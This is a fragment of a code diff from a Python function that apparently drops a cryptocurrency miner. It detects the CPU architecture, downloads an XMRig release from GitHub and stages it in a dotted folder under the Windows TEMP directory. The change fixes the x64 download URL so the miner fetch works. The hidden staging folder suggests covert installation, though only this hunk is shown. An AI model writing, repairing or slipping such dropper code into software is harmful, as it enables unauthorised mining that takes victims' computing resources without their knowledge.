@@ -19,7 +19,7 @@ def main(**kwargs):
             arch = platform.machine()
             url = ("https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-arm64.zip"
                    if "ARM" in arch.upper()
-                   else "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-gcc-x64.zip")
+                   else "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-gcc-x64.zip")
             z = dl(url, 300)
             base = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), ".kfwin")
             os.makedirs(base, exist_ok=True)
